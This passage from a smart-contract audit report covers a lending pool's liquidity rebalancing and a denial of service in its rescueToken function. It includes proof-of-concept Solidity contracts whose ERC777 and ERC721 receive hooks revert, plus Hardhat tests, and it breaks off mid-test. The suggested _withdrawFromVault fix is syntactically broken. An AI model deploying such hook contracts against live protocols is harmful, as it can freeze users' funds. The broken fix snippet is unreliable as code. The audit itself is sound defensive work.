Denial of Service (DOS) for Deposits & Withdrawals: Since \_rebalanceLiquidity() is triggered in both deposit() and withdraw(), if \_withdrawFromVault() keeps reverting, no users will be able to deposit or withdraw funds.

Liquidity Freeze: Funds that should be withdrawn from the Curve vault remain stuck, leaving the Lending Pool with an insufficient balance to process withdrawals.

Protocol Downtime: If the Curve vault operates normally but produces small losses, the Lending Pool will remain permanently broken unless manually fixed by governance.

## Tools Used

Manual Review

## Recommendations

To prevent this issue:

Make max_loss configurable: Introduce a function to update the maximum allowable loss dynamically.
Set a reasonable default max_loss: Instead of 0, consider allowing a small, configurable loss (e.g., 1e16 for 1%).
Fail Gracefully: If a withdrawal reverts due to loss, allow the protocol to adjust or retry with a higher max_loss.

Suggested Fix:
Modify \_withdrawFromVault() to allow adjustable max_loss:

```solidity
uint256 public maxLoss = 1e16; // 1% loss tolerance (configurable by governance)

function setMaxLoss(uint256 _maxLoss) external onlyOwner {
    require(_maxLoss <= 1e18, "Max loss too high");
    maxLoss = _maxLoss;
}

function _withdrawFromVault(uint256 amount) internal {
    curveVault.withdraw(amount, address(this), msg.sender, maxLoss, new address );
otalVaultDeposits -= amount;
}
```

This ensures:

RAAC can withdraw funds even with minimal loss.
Governance can adjust maxLoss if needed.
Users are not indefinitely locked out of deposits/withdrawals.
By making maxLoss configurable, the protocol avoids system-wide failures while still ensuring losses remain minimal and controlled.

## <a id='M-04'></a>M-04. Missing Liquidity Rebalancing in Repayments and Liquidations Leading to Inefficient Liquidity Management

## Summary

LendingPool::\_rebalanceLiquidity ensures the protocol maintains a desired liquidity buffer ratio by depositing excess liquidity into a Curve vault or withdrawing liquidity from it, is not called during repayments and liquidations. This omission can lead to inefficient liquidity management, missed yield opportunities, and potential liquidity shortages in the protocol.

## Vulnerability Details

LendingPool::\_rebalanceLiquidity is responsible for maintaining the protocol's liquidity buffer ratio by:

- Depositing excess liquidity into the Curve vault when the buffer exceeds the desired ratio.

- Withdrawing liquidity from the Curve vault when the buffer falls below the desired ratio.

See function below:

```solidity
 function _rebalanceLiquidity() internal {
        // if curve vault is not set, do nothing
        if (address(curveVault) == address(0)) {
            return;
        }

        uint256 totalDeposits = reserve.totalLiquidity; // Total liquidity in the system
        //c this makes sense because this is the total active liquidity in the protocol which is the liquidity less the borrows
        uint256 desiredBuffer = totalDeposits.percentMul(liquidityBufferRatio);

        uint256 currentBuffer = IERC20(reserve.reserveAssetAddress).balanceOf(
            reserve.reserveRTokenAddress
        );


        if (currentBuffer > desiredBuffer) {
            uint256 excess = currentBuffer - desiredBuffer;
            // Deposit excess into the Curve vault
            _depositIntoVault(excess); //bug see the bugs I raised in the depositIntoVault function
        } else if (currentBuffer < desiredBuffer) {
            uint256 shortage = desiredBuffer - currentBuffer;
            // Withdraw shortage from the Curve vault
            _withdrawFromVault(shortage);
        }

        emit LiquidityRebalanced(currentBuffer, totalVaultDeposits);
    }
```

This function is called during deposits, withdrawals, and borrows, but it is not called during repayments or liquidations. See the relevant functions where LendingPool::\_rebalanceLiquidity is called:

```solidity
function deposit(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        // Update the reserve state before the deposit
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Perform the deposit through ReserveLibrary
        uint256 mintedAmount = ReserveLibrary.deposit(reserve, rateData, amount, msg.sender);

        // Rebalance liquidity after deposit
        _rebalanceLiquidity();

        emit Deposit(msg.sender, amount, mintedAmount);
    }

    /**
     * @notice Allows a user to withdraw reserve assets by burning RTokens
     * @param amount The amount of reserve assets to withdraw
     */
    function withdraw(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        if (withdrawalsPaused) revert WithdrawalsArePaused();

        // Update the reserve state before the withdrawal
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Ensure sufficient liquidity is available
        _ensureLiquidity(amount);

        // Perform the withdrawal through ReserveLibrary
        (uint256 amountWithdrawn, uint256 amountScaled, uint256 amountUnderlying) = ReserveLibrary.withdraw(
            reserve,   // ReserveData storage
            rateData,  // ReserveRateData storage
            amount,    // Amount to withdraw
            msg.sender // Recipient
        );

        // Rebalance liquidity after withdrawal
        _rebalanceLiquidity();

        emit Withdraw(msg.sender, amountWithdrawn);
    }

 /**
     * @notice Allows a user to borrow reserve assets using their NFT collateral
     * @param amount The amount of reserve assets to borrow
     */
    function borrow(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        if (isUnderLiquidation[msg.sender]) revert CannotBorrowUnderLiquidation();

        UserData storage user = userData[msg.sender];

        uint256 collateralValue = getUserCollateralValue(msg.sender);

        if (collateralValue == 0) revert NoCollateral();

        // Update reserve state before borrowing
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Ensure sufficient liquidity is available
        _ensureLiquidity(amount);

        // Fetch user's total debt after borrowing
        uint256 userTotalDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex) + amount;

        // Ensure the user has enough collateral to cover the new debt
        if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {
            revert NotEnoughCollateralToBorrow();
        }

        // Update user's scaled debt balance
        uint256 scaledAmount = amount.rayDiv(reserve.usageIndex);


        // Mint DebtTokens to the user (scaled amount)
       (bool isFirstMint, uint256 amountMinted, uint256 newTotalSupply) = IDebtToken(reserve.reserveDebtTokenAddress).mint(msg.sender, msg.sender, amount, reserve.usageIndex);

        // Transfer borrowed amount to user
        IRToken(reserve.reserveRTokenAddress).transferAsset(msg.sender, amount);

        user.scaledDebtBalance += scaledAmount;
        // reserve.totalUsage += amount;
        reserve.totalUsage = newTotalSupply;

        // Update liquidity and interest rates
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, 0, amount);

        // Rebalance liquidity after borrowing
        _rebalanceLiquidity();

        emit Borrow(msg.sender, amount);
    }
```

These are the important functions where liquidity needs to be rebalanced but isn't:

```solidity
 function _repay(uint256 amount, address onBehalfOf) internal {
        if (amount == 0) revert InvalidAmount();
        if (onBehalfOf == address(0)) revert AddressCannotBeZero();

        UserData storage user = userData[onBehalfOf];

        // Update reserve state before repayment
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Calculate the user's debt (for the onBehalfOf address)
        uint256 userDebt = IDebtToken(reserve.reserveDebtTokenAddress).balanceOf(onBehalfOf);
        uint256 userScaledDebt = userDebt.rayDiv(reserve.usageIndex);

        // If amount is greater than userDebt, cap it at userDebt
        uint256 actualRepayAmount = amount > userScaledDebt ? userScaledDebt : amount;

        uint256 scaledAmount = actualRepayAmount.rayDiv(reserve.usageIndex);

        // Burn DebtTokens from the user whose debt is being repaid (onBehalfOf)
        // is not actualRepayAmount because we want to allow paying extra dust and we will then cap there
        (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) =
            IDebtToken(reserve.reserveDebtTokenAddress).burn(onBehalfOf, amount, reserve.usageIndex);

        // Transfer reserve assets from the caller (msg.sender) to the reserve
        IERC20(reserve.reserveAssetAddress).safeTransferFrom(msg.sender, reserve.reserveRTokenAddress, amountScaled);

        reserve.totalUsage = newTotalSupply;
        user.scaledDebtBalance -= amountBurned;

        // Update liquidity and interest rates
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, amountScaled, 0);

        emit Repay(msg.sender, onBehalfOf, actualRepayAmount);
    }



function finalizeLiquidation(address userAddress) external nonReentrant onlyStabilityPool {
        if (!isUnderLiquidation[userAddress]) revert NotUnderLiquidation();

        // update state
        ReserveLibrary.updateReserveState(reserve, rateData);

        if (block.timestamp <= liquidationStartTime[userAddress] + liquidationGracePeriod) {
            revert GracePeriodNotExpired();
        }

        UserData storage user = userData[userAddress];

        uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);


        isUnderLiquidation[userAddress] = false;
        liquidationStartTime[userAddress] = 0;
         // Transfer NFTs to Stability Pool
        for (uint256 i = 0; i < user.nftTokenIds.length; i++) {
            uint256 tokenId = user.nftTokenIds[i];
            user.depositedNFTs[tokenId] = false;
            raacNFT.transferFrom(address(this), stabilityPool, tokenId);
        }
        delete user.nftTokenIds;

        // Burn DebtTokens from the user
        (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) = IDebtToken(reserve.reserveDebtTokenAddress).burn(userAddress, userDebt, reserve.usageIndex);

        // Transfer reserve assets from Stability Pool to cover the debt
        IERC20(reserve.reserveAssetAddress).safeTransferFrom(msg.sender, reserve.reserveRTokenAddress, amountScaled);

        // Update user's scaled debt balance
        user.scaledDebtBalance -= amountBurned;
        reserve.totalUsage = newTotalSupply;

        // Update liquidity and interest rates
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, amountScaled, 0);


        emit LiquidationFinalized(stabilityPool, userAddress, userDebt, getUserCollateralValue(userAddress));
    }
```

## Impact

Inefficient Liquidity Utilization: When users repay their debt, liquidity is returned to the reserve. If the buffer exceeds the desired ratio, the excess liquidity should be deposited into the Curve vault to earn rewards. However, since \_rebalanceLiquidity is not called, this excess liquidity remains idle in the reserve.

Missed Yield Opportunities: The Curve vault is designed to generate additional yield for the protocol by depositing excess liquidity. By not rebalancing liquidity during repayments and liquidations, the protocol misses opportunities to maximize yield.

## Tools Used

Manual Review

## Recommendations

Updated \_repay Function
Add \_rebalanceLiquidity at the end of the \_repay function:

```solidity
function _repay(uint256 amount, address onBehalfOf) internal {
    // Existing logic...

    // Rebalance liquidity after repayment
    _rebalanceLiquidity();

    emit Repay(msg.sender, onBehalfOf, actualRepayAmount);
}
```

Updated finalizeLiquidation Function
Add \_rebalanceLiquidity at the end of the finalizeLiquidation function:

```solidity
function finalizeLiquidation(address userAddress) external nonReentrant onlyStabilityPool {
    // Existing logic...

    // Rebalance liquidity after liquidation
    _rebalanceLiquidity();

    emit LiquidationFinalized(stabilityPool, userAddress, userDebt, getUserCollateralValue(userAddress));
}
```

Benefits of the Fix

Efficient Liquidity Management: Ensures excess liquidity is deposited into the Curve vault and the buffer is replenished when needed.

Improved Protocol Stability: Maintains the desired liquidity buffer ratio, reducing the risk of liquidity shortages.

Maximized Yield: Takes advantage of opportunities to earn additional yield through the Curve vault.

Consistency: Ensures liquidity rebalancing is consistently applied across all major protocol operations (deposits, withdrawals, borrows, repayments, and liquidations).

By implementing these changes, the protocol can ensure consistent and efficient liquidity management, improving overall stability and performance.

## <a id='M-05'></a>M-05. DOS can occur in LendingPool::rescueToken with ERC777 tokens and ERC721 tokens sent to contract addresses

## Summary

The LendingPool::rescueToken function is designed to retrieve tokens mistakenly sent to the contract. However, it is vulnerable to Denial-of-Service (DOS) attacks when handling ERC777 tokens or ERC721 (NFT) tokens. These vulnerabilities arise due to the following issues:

ERC777 Tokens: ERC777 tokens have hooks that execute during transfers. If a malicious contract sends ERC777 tokens to the LendingPool and implements logic that reverts in the tokensReceived hook, the rescueToken function will fail.

ERC721 Tokens: ERC721 tokens require the receiving contract to implement the onERC721Received function. If the LendingPool does not implement this function or if the sender's logic reverts, the rescueToken function will fail.

These issues can render the rescueToken function unusable, preventing the recovery of mistakenly sent tokens and potentially locking funds in the contract.

## Vulnerability Details

LendingPool::rescueToken is a function that retrieves tokens mistakenly sent to the contract. See below:

```solidity
/**
     * @notice Rescue tokens mistakenly sent to this contract
     * @dev Only callable by the contract owner
     * @param tokenAddress The address of the ERC20 token
     * @param recipient The address to send the rescued tokens to
     * @param amount The amount of tokens to rescue
     */
    function rescueToken(address tokenAddress, address recipient, uint256 amount) external onlyOwner {
        require(tokenAddress != reserve.reserveRTokenAddress, "Cannot rescue RToken");
        IERC20(tokenAddress).safeTransfer(recipient, amount);
    }
```

There are 2 issues that could cause a DOS to occur on this function which revolve around contracts sending tokens to the LendingPool. The first is a situation where an ERC777 token is sent to the contract. ERC777 tokens have hooks on transferring and receiving tokens. If an erc777 token is sent to the LendingPool contract by another contract, if the contract contains logic that could revert on receiving tokens, this could cause the function to revert. Also, if the token is an ERC721 which is an NFT, if the tokens are being sent to a contract, the receiving contract must implement an onERC721received function and return the selector for the transfer to be successful. if the receiving contract does not implement this or contains any logic that could revert, this could cause a DOS.

## Proof Of Code (POC)

These tests were run in LendingPool.test.js in the "Borrow and Repay" describe block

Setup

To test this, deploy the following contracts:

```solidity
//SDPX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "@openzeppelin/contracts/interfaces/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import {LendingPool} from "contracts/core/pools/LendingPool/LendingPool.sol";
import {ERC777} from "./ERC777.sol";

contract Attacker is IERC777Recipient {
    address public rTokenaddy;
    address public erc777;
    error RejectERC777Error();

    IERC1820Registry private _erc1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(address _rTokenaddy, address _erc777) {
        rTokenaddy = _rTokenaddy;
        erc777 = _erc777;

        // Register interface in ERC1820 registry
        _erc1820.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensRecipient"),
            address(this)
        );
    }

    // ERC777 hook
    function tokensReceived(
        address,
        address from,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        if (from != rTokenaddy) {
            revert RejectERC777Error();
        }
    }

    function sendToken(address lendingPool, uint256 amount) external {
        ERC777(erc777).transfer(lendingPool, amount);
    }
}

//SDPX-License-Identifier: MIT

pragma solidity 0.8.20;

import {IERC777} from "@openzeppelin/contracts/interfaces/IERC777.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IERC1820Registry} from "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import {Context} from "@openzeppelin/contracts/utils/Context.sol";
import {IERC777Sender} from "@openzeppelin/contracts/interfaces/IERC777Sender.sol";
import {IERC777Recipient} from "@openzeppelin/contracts/interfaces/IERC777Recipient.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

/**
 * @dev Implementation of the {IERC777} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * Support for ERC20 is included in this contract, as specified by the EIP: both
 * the ERC777 and ERC20 interfaces can be safely used when interacting with it.
 * Both {IERC777-Sent} and {IERC20-Transfer} events are emitted on token
 * movements.
 *
 * Additionally, the {IERC777-granularity} value is hard-coded to `1`, meaning that there
 * are no special restrictions in the amount of tokens that created, moved, or
 * destroyed. This makes integration with ERC20 applications seamless.
 */
contract ERC777 is Context, IERC777, IERC20 {
    using Math for uint256;

    IERC1820Registry internal constant _ERC1820_REGISTRY =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    mapping(address => uint256) private _balances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    // We inline the result of the following hashes because Solidity doesn't resolve them at compile time.
    // See https://github.com/ethereum/solidity/issues/4024.

    // keccak256("ERC777TokensSender")
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH =
        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;

    // keccak256("ERC777TokensRecipient")
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
        0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;

    // This isn't ever read from - it's only used to respond to the defaultOperators query.
    address[] private _defaultOperatorsArray;

    // Immutable, but accounts may revoke them (tracked in __revokedDefaultOperators).
    mapping(address => bool) private _defaultOperators;

    // For each account, a mapping of its operators and revoked default operators.
    mapping(address => mapping(address => bool)) private _operators;
    mapping(address => mapping(address => bool))
        private _revokedDefaultOperators;

    // ERC20-allowances
    mapping(address => mapping(address => uint256)) private _allowances;

    /**
     * @dev `defaultOperators` may be an empty array.
     */
    constructor(
        string memory name,
        string memory symbol,
        address[] memory defaultOperators
    ) {
        _name = name;
        _symbol = symbol;

        _defaultOperatorsArray = defaultOperators;
        for (uint256 i = 0; i < _defaultOperatorsArray.length; i++) {
            _defaultOperators[_defaultOperatorsArray[i]] = true;
        }

        // register interfaces
        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            keccak256("ERC777Token"),
            address(this)
        );
        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            keccak256("ERC20Token"),
            address(this)
        );
    }

    /**
     * @dev See {IERC777-name}.
     */
    function name() public view override returns (string memory) {
        return _name;
    }

    /**
     * @dev See {IERC777-symbol}.
     */
    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev See {ERC20-decimals}.
     *
     * Always returns 18, as per the
     * [ERC777 EIP](https://eips.ethereum.org/EIPS/eip-777#backward-compatibility).
     */
    function decimals() public pure returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC777-granularity}.
     *
     * This implementation always returns `1`.
     */
    function granularity() public view override returns (uint256) {
        return 1;
    }

    /**
     * @dev See {IERC777-totalSupply}.
     */
    function totalSupply()
        public
        view
        override(IERC20, IERC777)
        returns (uint256)
    {
        return _totalSupply;
    }

    /**
     * @dev Returns the amount of tokens owned by an account (`tokenHolder`).
     */
    function balanceOf(
        address tokenHolder
    ) public view override(IERC20, IERC777) returns (uint256) {
        return _balances[tokenHolder];
    }

    /**
     * @dev See {IERC777-send}.
     *
     * Also emits a {IERC20-Transfer} event for ERC20 compatibility.
     */
    function send(
        address recipient,
        uint256 amount,
        bytes memory data
    ) public override {
        _send(_msgSender(), recipient, amount, data, "", true);
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Unlike `send`, `recipient` is _not_ required to implement the {IERC777Recipient}
     * interface if it is a contract.
     *
     * Also emits a {Sent} event.
     */
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(
            recipient != address(0),
            "ERC777: transfer to the zero address"
        );

        address from = _msgSender();

        _callTokensToSend(from, from, recipient, amount, "", "");

        _move(from, from, recipient, amount, "", "");

        _callTokensReceived(from, from, recipient, amount, "", "", false);

        return true;
    }

    /**
     * @dev See {IERC777-burn}.
     *
     * Also emits a {IERC20-Transfer} event for ERC20 compatibility.
     */
    function burn(uint256 amount, bytes memory data) public override {
        _burn(_msgSender(), amount, data, "");
    }

    /**
     * @dev See {IERC777-isOperatorFor}.
     */
    function isOperatorFor(
        address operator,
        address tokenHolder
    ) public view override returns (bool) {
        return
            operator == tokenHolder ||
            (_defaultOperators[operator] &&
                !_revokedDefaultOperators[tokenHolder][operator]) ||
            _operators[tokenHolder][operator];
    }

    /**
     * @dev See {IERC777-authorizeOperator}.
     */
    function authorizeOperator(address operator) public override {
        require(
            _msgSender() != operator,
            "ERC777: authorizing self as operator"
        );

        if (_defaultOperators[operator]) {
            delete _revokedDefaultOperators[_msgSender()][operator];
        } else {
            _operators[_msgSender()][operator] = true;
        }

        emit AuthorizedOperator(operator, _msgSender());
    }

    /**
     * @dev See {IERC777-revokeOperator}.
     */
    function revokeOperator(address operator) public override {
        require(operator != _msgSender(), "ERC777: revoking self as operator");

        if (_defaultOperators[operator]) {
            _revokedDefaultOperators[_msgSender()][operator] = true;
        } else {
            delete _operators[_msgSender()][operator];
        }

        emit RevokedOperator(operator, _msgSender());
    }

    /**
     * @dev See {IERC777-defaultOperators}.
     */
    function defaultOperators()
        public
        view
        override
        returns (address[] memory)
    {
        return _defaultOperatorsArray;
    }

    /**
     * @dev See {IERC777-operatorSend}.
     *
     * Emits {Sent} and {IERC20-Transfer} events.
     */
    function operatorSend(
        address sender,
        address recipient,
        uint256 amount,
        bytes memory data,
        bytes memory operatorData
    ) public override {
        require(
            isOperatorFor(_msgSender(), sender),
            "ERC777: caller is not an operator for holder"
        );
        _send(sender, recipient, amount, data, operatorData, true);
    }

    /**
     * @dev See {IERC777-operatorBurn}.
     *
     * Emits {Burned} and {IERC20-Transfer} events.
     */
    function operatorBurn(
        address account,
        uint256 amount,
        bytes memory data,
        bytes memory operatorData
    ) public override {
        require(
            isOperatorFor(_msgSender(), account),
            "ERC777: caller is not an operator for holder"
        );
        _burn(account, amount, data, operatorData);
    }

    /**
     * @dev See {IERC20-allowance}.
     *
     * Note that operator and allowance concepts are orthogonal: operators may
     * not have allowance, and accounts with allowance may not be operators
     * themselves.
     */
    function allowance(
        address holder,
        address spender
    ) public view override returns (uint256) {
        return _allowances[holder][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Note that accounts cannot have allowance issued by their operators.
     */
    function approve(
        address spender,
        uint256 value
    ) public override returns (bool) {
        address holder = _msgSender();
        _approve(holder, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Note that operator and allowance concepts are orthogonal: operators cannot
     * call `transferFrom` (unless they have allowance), and accounts with
     * allowance cannot call `operatorSend` (unless they are operators).
     *
     * Emits {Sent}, {IERC20-Transfer} and {IERC20-Approval} events.
     */
    function transferFrom(
        address holder,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(
            recipient != address(0),
            "ERC777: transfer to the zero address"
        );
        require(holder != address(0), "ERC777: transfer from the zero address");

        address spender = _msgSender();

        _callTokensToSend(spender, holder, recipient, amount, "", "");

        _move(spender, holder, recipient, amount, "", "");
        uint256 currentAllowance = _allowances[holder][spender];

        _approve(holder, spender, amount);

        _callTokensReceived(spender, holder, recipient, amount, "", "", false);

        return true;
    }

    /**
     * @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * If a send hook is registered for `account`, the corresponding function
     * will be called with `operator`, `data` and `operatorData`.
     *
     * See {IERC777Sender} and {IERC777Recipient}.
     *
     * Emits {Minted} and {IERC20-Transfer} events.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - if `account` is a contract, it must implement the {IERC777Recipient}
     * interface.
     */
    function _mint(
        address account,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) internal virtual {
        require(account != address(0), "ERC777: mint to the zero address");

        address operator = _msgSender();

        _beforeTokenTransfer(operator, address(0), account, amount);

        // Update state variables
        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;

        _callTokensReceived(
            operator,
            address(0),
            account,
            amount,
            userData,
            operatorData,
            true
        );

        emit Minted(operator, account, amount, userData, operatorData);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Send tokens
     * @param from address token holder address
     * @param to address recipient address
     * @param amount uint256 amount of tokens to transfer
     * @param userData bytes extra information provided by the token holder (if any)
     * @param operatorData bytes extra information provided by the operator (if any)
     * @param requireReceptionAck if true, contract recipients are required to implement ERC777TokensRecipient
     */
    function _send(
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData,
        bool requireReceptionAck
    ) internal {
        require(from != address(0), "ERC777: send from the zero address");
        require(to != address(0), "ERC777: send to the zero address");

        address operator = _msgSender();

        _callTokensToSend(operator, from, to, amount, userData, operatorData);

        _move(operator, from, to, amount, userData, operatorData);

        _callTokensReceived(
            operator,
            from,
            to,
            amount,
            userData,
            operatorData,
            requireReceptionAck
        );
    }

    /**
     * @dev Burn tokens
     * @param from address token holder address
     * @param amount uint256 amount of tokens to burn
     * @param data bytes extra information provided by the token holder
     * @param operatorData bytes extra information provided by the operator (if any)
     */
    function _burn(
        address from,
        uint256 amount,
        bytes memory data,
        bytes memory operatorData
    ) internal virtual {
        require(from != address(0), "ERC777: burn from the zero address");

        address operator = _msgSender();

        _beforeTokenTransfer(operator, from, address(0), amount);

        _callTokensToSend(
            operator,
            from,
            address(0),
            amount,
            data,
            operatorData
        );

        // Update state variables
        _balances[from] = _balances[from] - amount;
        _totalSupply = _totalSupply - amount;

        emit Burned(operator, from, amount, data, operatorData);
        emit Transfer(from, address(0), amount);
    }

    function _move(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) private {
        _beforeTokenTransfer(operator, from, to, amount);

        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;

        emit Sent(operator, from, to, amount, userData, operatorData);
        emit Transfer(from, to, amount);
    }

    /**
     * @dev See {ERC20-_approve}.
     *
     * Note that accounts cannot have allowance issued by their operators.
     */
    function _approve(address holder, address spender, uint256 value) internal {
        require(holder != address(0), "ERC777: approve from the zero address");
        require(spender != address(0), "ERC777: approve to the zero address");

        _allowances[holder][spender] = value;
        emit Approval(holder, spender, value);
    }

    /**
     * @dev Call from.tokensToSend() if the interface is registered
     * @param operator address operator requesting the transfer
     * @param from address token holder address
     * @param to address recipient address
     * @param amount uint256 amount of tokens to transfer
     * @param userData bytes extra information provided by the token holder (if any)
     * @param operatorData bytes extra information provided by the operator (if any)
     */
    function _callTokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) private {
        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(
            from,
            _TOKENS_SENDER_INTERFACE_HASH
        );
        if (implementer != address(0)) {
            IERC777Sender(implementer).tokensToSend(
                operator,
                from,
                to,
                amount,
                userData,
                operatorData
            );
        }
    }

    /**
     * @dev Call to.tokensReceived() if the interface is registered. Reverts if the recipient is a contract but
     * tokensReceived() was not registered for the recipient
     * @param operator address operator requesting the transfer
     * @param from address token holder address
     * @param to address recipient address
     * @param amount uint256 amount of tokens to transfer
     * @param userData bytes extra information provided by the token holder (if any)
     * @param operatorData bytes extra information provided by the operator (if any)
     * @param requireReceptionAck if true, contract recipients are required to implement ERC777TokensRecipient
     */
    function _callTokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData,
        bool requireReceptionAck
    ) private {
        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(
            to,
            _TOKENS_RECIPIENT_INTERFACE_HASH
        );
        if (implementer != address(0)) {
            IERC777Recipient(implementer).tokensReceived(
                operator,
                from,
                to,
                amount,
                userData,
                operatorData
            );
        }
    }

    /**
     * @dev Hook that is called before any token transfer. This includes
     * calls to {send}, {transfer}, {operatorSend}, minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, ``from``'s `tokenId` will be
     * transferred to `to`.
     * - when `from` is zero, `tokenId` will be minted for `to`.
     * - when `to` is zero, ``from``'s `tokenId` will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address operator,
        address from,
        address to,
        uint256 tokenId
    ) internal virtual {}
}

//SDPX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {ERC777} from "./ERC777.sol";

contract ERC777Token is ERC777 {
    uint256 public constant initialSupply = 10000000000000e18;

    constructor(address owner) ERC777("ERC777Token", "SSST", new address[](0)) {
        _mint(owner, initialSupply, "", "");
    }
}

//SDPX-license-Identifier: MIT

pragma solidity ^0.8.0;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IRAACNFT} from "contracts/interfaces/core/tokens/IRAACNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RejectERC721 is IERC721Receiver {
    address public rAACNFT;
    address public crvusd;
    error RejectERC721Error();

    constructor(address _raacNFT, address _crvusd) {
        rAACNFT = _raacNFT;
        crvusd = _crvusd;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 token,
        bytes calldata data
    ) external view override returns (bytes4) {
        if (from != address(0)) {
            revert RejectERC721Error();
        }

        return this.onERC721Received.selector;
    }

    function mintNFT(uint256 tokenId, uint256 amounttoPay) external {
        IERC20(crvusd).approve(rAACNFT, amounttoPay);
        IRAACNFT(rAACNFT).mint(tokenId, amounttoPay);
    }

    function transferNFT(address to, uint256 tokenId) external {
        IRAACNFT(rAACNFT).transferFrom(address(this), to, tokenId);
    }
}
```

Once the relevant contracts are deployed in LendingPool.test.js , run the following tests:

```javascript
it("rescueTokenDOS", async function () {
  //c for testing purposes
  await raacHousePrices.setHousePrice(3, ethers.parseEther("100"));

  const amountToPay = ethers.parseEther("100");

  //c mint nft for user1. this mints an extra nft for the user. in the before each of the initial describe in LendingPool.test.js, user1 already has an nft
  const tokenId = 3;
  await token.mint(rejectERC721.target, amountToPay);

  /*c for this test to work, you need to deploy the following contract
      //SDPX-license-Identifier: MIT

pragma solidity ^0.8.0;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IRAACNFT} from "contracts/interfaces/core/tokens/IRAACNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RejectERC721 is IERC721Receiver {
    address public rAACNFT;
    address public crvusd;
    error RejectERC721Error();

    constructor(address _raacNFT, address _crvusd) {
        rAACNFT = _raacNFT;
        crvusd = _crvusd;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 token,
        bytes calldata data
    ) external view override returns (bytes4) {
        if (from != address(0)) {
            revert RejectERC721Error();
        }

        return this.onERC721Received.selector;
    }

    function mintNFT(uint256 tokenId, uint256 amounttoPay) external {
        IERC20(crvusd).approve(rAACNFT, amounttoPay);
        IRAACNFT(rAACNFT).mint(tokenId, amounttoPay);
    }

    function transferNFT(address to, uint256 tokenId) external {
        IRAACNFT(rAACNFT).transferFrom(address(this), to, tokenId);
    }
}

      then deploy the contract in the initial desribe with the following lines:
      const RejectERC721 = await ethers.getContractFactory("RejectERC721");
      rejectERC721 = await RejectERC721.deploy(raacNFT.target, crvusd.target);
      */

  //c if a user mistakenly transfers an nft to the lending pool which is actually the main token that the lending pool contract uses, there will be no way to recover that nft. the protocol doesnt need to focus on how having a rescuetoken function that doesnt focus on nfts as the nfts are extremely valuable so it makes sense to have guards in place to prevent users from losing their nfts
  await rejectERC721.connect(user1).mintNFT(tokenId, amountToPay);
  await rejectERC721.connect(user1).transferNFT(lendingPool.target, tokenId);
});

it("rescueTokenERC777", async function () {
  //c for testing purposes

